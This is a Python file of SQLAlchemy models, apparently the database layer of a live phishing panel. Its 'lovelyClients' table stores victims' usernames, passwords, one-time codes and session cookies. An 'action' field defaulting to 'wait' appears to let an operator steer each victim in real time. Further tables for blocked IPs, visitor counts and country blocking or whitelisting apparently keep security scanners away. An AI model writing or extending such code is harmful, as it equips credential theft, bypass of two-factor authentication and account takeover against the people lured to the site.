from sqlalchemy import Boolean, Column, Integer, String

from database import Base


class User(Base):
    __tablename__ = "lovelyClients"

    id = Column(Integer, primary_key=True, index=True)
    ip = Column(String)
    user_agent = Column(String, default="aaaaaaaa")
    username = Column(String)
    password = Column(String)
    action = Column(String, default="wait")
    OTP = Column(String)
    Cookies = Column(String, default="None")
    notification_msg = Column(String, default="")


class Blocked_IP(Base):
    __tablename__ = "blocked_ip"
    id = Column(Integer, primary_key=True, index=True, autoincrement=True)
    ip = Column(String)


class Visitor(Base):
    __tablename__ = "visitors"
    id = Column(String, primary_key=True, index=True)
    visit_count = Column(Integer, default=1)


class Blocked_County(Base):
    __tablename__ = "blocked_county"
    id = Column(Integer, primary_key=True, index=True, autoincrement=True)
    county = Column(String)


class whitelisted_Country(Base):
    __tablename__ = "whitelisted_county"
    id = Column(Integer, primary_key=True, index=True, autoincrement=True)
    country = Column(String)


# TODO: switch to yaml file later
class Config(Base):
    __tablename__ = "Config"
    id = Column(Integer, primary_key=True)
    automode = Column(Boolean, default=False)


# TODO: move config to a table
# class Config(Base):
